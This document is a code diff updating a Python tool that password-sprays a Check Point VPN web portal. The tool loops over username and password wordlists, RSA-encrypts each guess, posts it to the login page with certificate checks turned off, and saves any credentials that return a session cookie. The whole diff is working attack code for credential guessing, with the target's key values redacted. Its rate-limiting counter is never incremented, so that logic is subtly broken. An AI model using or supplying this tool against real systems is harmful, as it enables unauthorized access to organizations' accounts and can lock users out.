@@ -1,21 +1,38 @@
-#!/usr/bin/python
+#!/usr/bin/env python
+# -*-coding:Utf-8- -*
+
+# This script will password spray a checkpoint VPN over a period of time
+# !!! Be carefull of password policy and account lockout restriction !!!
 
 import sys
 import os
-from Crypto.PublicKey  import RSA
-import requests
+import argparse
 import time
+import concurrent.futures
+import requests
 from urllib.parse import urlparse
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
+from Crypto.PublicKey  import RSA
 
 #Disabling HTTPS certificate verification
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
-#User Args
-url="hxxps://xxxxx.com/Login/Login"
+#User Args: Username wordlist, password wordlist and Cookies needs to be modified
 Headers={"Content-Type": "application/x-www-form-urlencoded"}
 Cookies={"CheckCookieSupport":"1","_ga":"xxxx","_fbp":"xxxx","_gcl_au":"xxxx","selected_realm":"ssl_vpn","_gid":"xxxx"}
-timer=1800
+usernameList="./usernames.txt"
+passwordList="./pass.txt"
+
+#User arguments function
+def get_Args():
+    parser = argparse.ArgumentParser(description='Password Spray tool for CheckPoint VPN web interface: python3 checkpointSpray.py -u https://acces.company.com/Login/Login usernames.txt passwords.txt -a 2 -t 30')
+    parser.add_argument('-u','--url', help='CheckPoint Login URL to spray', required=True)
+    parser.add_argument('-a','--attempt',help='Number of attempts to be run per user at each timer loop', type=int, required=True)
+    parser.add_argument('-t','--time',help='Relaunch spray every X minutes', type=int, required=True)
+    args = parser.parse_args()
+	
+    return args
+	
 
 if sys.version_info >= (3,) :
     def b_ord (x) :
@@ -35,8 +52,8 @@ def iterbytes (x) :
 
 def pubkey(password) :
     # Exponent (e) and Modulus (m) are stored within the JavaScript file JS_RSA.JS (var modulus / var exponent)
-    e = int(b'xxxxxx', 16)
-    m = int('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx',16)
+    e = int(b'XXXXX', 16)
+    m = int('XXXXXXXXXXXXXXXXXXXXXXXXXXXX',16)
     pubkey  = RSA.construct((m, e))
     passpass = encrypt(password,pubkey)
     return passpass
@@ -64,35 +81,41 @@ def encrypt(password,pubkey) :
     e = ''.join ('%02x' % b_ord(c) for c in reversed(e))
     return e
 
-while True:
-    passfile = open("./passwords.txt","r")
 
-    for password in passfile:
+def spray(url, usernameList, passwordList, attempt, loop):
+    counter = 1
+    passwords = open(passwordList, "r")
+    for password in passwords:
         passwd = (password.strip("\n"))
         print("\n########### Starting with password : "+passwd+" ###########\n")
-        userfile = open("./users.txt", "r")
-        
-        for user in userfile:    
-            encryptedpass = pubkey(passwd)
+                
+        users = open(usernameList, "r")    
+        encryptedpass = pubkey(passwd)
+        for user in users:
             username = (user.strip("\n"))
-            
+
             data = {"selectedReal": "ssl_vpn", "loginType": "Standard", "userName": username,"password": encryptedpass}
             req = requests.post(url, data=data, headers=Headers, cookies=Cookies, verify=False, allow_redirects=False)
             
             print("--- Username : "+username+" : "+passwd)
 
             if req.cookies.get('AuthSessionID'):
-                print("+++++++++ Found valid credentials: "+ username + " : " + passwd + " +++++++++")
+                print("+++++++++ Found VALID credentials: "+ username + " : " + passwd + " +++++++++")
                 result = open("./credentials.txt", "a")
-                result.write(username+":"+passwd)
+                result.write(username+":"+passwd+"\n")
                 result.close()
 
             else:
                 continue
-        
-        print("Sleeping after password : " + passwd)
-        
-        time.sleep(timer)
-    
-    userfile.close()
-    passfile.close()
+
+        if counter == attempt:
+            print("\n.......... Sleeping for "+ str(loop) + "min after password : " + passwd + "..........")        
+            time.sleep(loop*60)
+        else:
+            continue
+
+if __name__ == "__main__":
+    args = get_Args()
+    print(" ==> Launching Password Spray against following target :\n")
+    print(" - CheckPoint URL : %s" % args.url)
+    spray(args.url, usernameList, passwordList, args.attempt, args.time)
